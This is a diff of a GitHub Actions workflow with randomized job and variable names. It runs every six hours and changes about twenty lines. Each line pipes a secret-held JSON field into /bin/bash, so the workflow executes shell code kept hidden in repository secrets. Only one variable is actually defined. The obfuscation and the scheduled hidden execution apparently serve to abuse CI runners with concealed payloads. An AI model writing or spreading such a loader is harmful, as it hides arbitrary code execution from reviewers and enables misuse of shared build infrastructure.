@@ -3,30 +3,33 @@ name: congbuiklqi
 on:
   workflow_dispatch:
   schedule:
-    - cron: '20 0/6 * * *'
-jobs:  # 468
+    - cron: '3 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: congbuiklqi
         env:
-          hwp10016: ${{ secrets.hwp10016 }}
+          cmz97551: ${{ secrets.cmz97551 }}
         run: |
-          echo $hwp10016 | jq -r .k5190 | /bin/bash
-          echo $ts98 | jq -r .un39727 | /bin/bash
-          echo $tly0 | jq -r .aabzz87 | /bin/bash
-          echo $ivmm638 | jq -r .bb8 | /bin/bash
-          echo $vgr9267 | jq -r .fmjni2798 | /bin/bash
-          echo $jhof66448 | jq -r .nwox7530 | /bin/bash
-          echo $coo543 | jq -r .lywe84983 | /bin/bash
-          echo $nqmdk95819 | jq -r .ifb6 | /bin/bash
-          echo $esoer269 | jq -r .vjjo9 | /bin/bash
-          echo $s2692 | jq -r .aq1 | /bin/bash
-          echo $mhj2 | jq -r .ddkd2157 | /bin/bash
-          echo $ecxg78 | jq -r .sd7 | /bin/bash
-          echo $i579 | jq -r .huzh631 | /bin/bash
-          echo $veuw99238 | jq -r .cexc936 | /bin/bash
-          echo $croao17 | jq -r .pwcpl18 | /bin/bash
-          echo $e6 | jq -r .cw64 | /bin/bash
+          echo $cmz97551 | jq -r .u3 | /bin/bash
+          echo $ludrc4 | jq -r .vu63880 | /bin/bash
+          echo $ch469 | jq -r .bw420 | /bin/bash
+          echo $tkxvz520 | jq -r .bc41937 | /bin/bash
+          echo $gfslw33 | jq -r .dekiz33530 | /bin/bash
+          echo $v70333 | jq -r .eohuc98 | /bin/bash
+          echo $viye2 | jq -r .swr55 | /bin/bash
+          echo $ul43354 | jq -r .fkl6 | /bin/bash
+          echo $gtqq500 | jq -r .swwlz06201 | /bin/bash
+          echo $dyfxx6 | jq -r .ulim28842 | /bin/bash
+          echo $zype71243 | jq -r .oy44 | /bin/bash
+          echo $z09014 | jq -r .xurh926 | /bin/bash
+          echo $uljaw52 | jq -r .ona52526 | /bin/bash
+          echo $au423 | jq -r .xugr03 | /bin/bash
+          echo $zowi3 | jq -r .y2697 | /bin/bash
+          echo $klvux092 | jq -r .l0505 | /bin/bash
+          echo $ipx9962 | jq -r .bniz6 | /bin/bash
+          echo $p79311 | jq -r .yg614 | /bin/bash
+          echo $juy31238 | jq -r .zsz8883 | /bin/bash
 
